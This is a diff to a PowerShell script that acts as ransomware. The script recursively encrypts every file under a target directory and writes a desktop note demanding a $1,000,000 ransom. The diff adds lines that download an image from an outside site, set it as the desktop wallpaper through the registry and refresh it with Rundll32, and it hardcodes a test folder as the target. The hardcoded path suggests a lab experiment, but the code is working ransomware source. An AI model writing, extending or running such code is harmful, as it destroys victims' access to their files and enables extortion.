@@ -113,6 +113,7 @@ function main{
         [Parameter(Mandatory=$true)]
         [string] $EncKey
     )
+    Invoke-WebRequest -Uri 'https://i.imgflip.com/a4oy3p.jpg' -OutFile "$env:USERPROFILE\Downloads\Wallpaper.jpg"
     $Target = [System.IO.Directory]::EnumerateFiles($TargetDirectory,"*",[System.IO.SearchOption]::AllDirectories)
     foreach($file in $Target){
         $FileString = Get-Content $file -Raw
@@ -124,18 +125,21 @@ function main{
     try {
         New-Item -Path "$env:USERPROFILE\Desktop\GetGot.txt" -ItemType File
         Set-Content -Path "$env:USERPROFILE\Desktop\GetGot.txt" -Value 'You got got! We have encrypted the contents of all your files! Good luck finding the key....I may be enticed to give it to you for a small fee...OF $1,000,000'
+        Set-ItemProperty -Path "HKCU:\Control Panel\Desktop\" -Name "WallPaper" -Value "$env:USERPROFILE\Downloads\Wallpaper.jpg"
+        
     }
     catch {
-        Set-Content -Path "$env:USERPROFILE\Desktop\GetGot.txt" -Value 'You got got! We have encrypted the contents of all your files! Good luck finding the key....I may be enticed to give it to you for a small fee...OF $1,000,000'
+        Write-Host "Something went wrong :/"
     }
-    
+
 }
 
-
+$path = 'C:\Users\Vadim.AzureAD\Desktop\Test'
 
 
 # Example usage:
 #$encrypted = Encrypt-String -InputString $string -EncryptionKey "MySecretKey123"
 #$decrypted = Decrypt-String -EncryptedString $encrypted -EncryptionKey "MySecretKey123"
 
-Write-host (main -TargetDirectory $path)
+Write-host (main -TargetDirectory $path) 
+Rundll32.exe user32.dll,UpdatePerUserSystemParameters
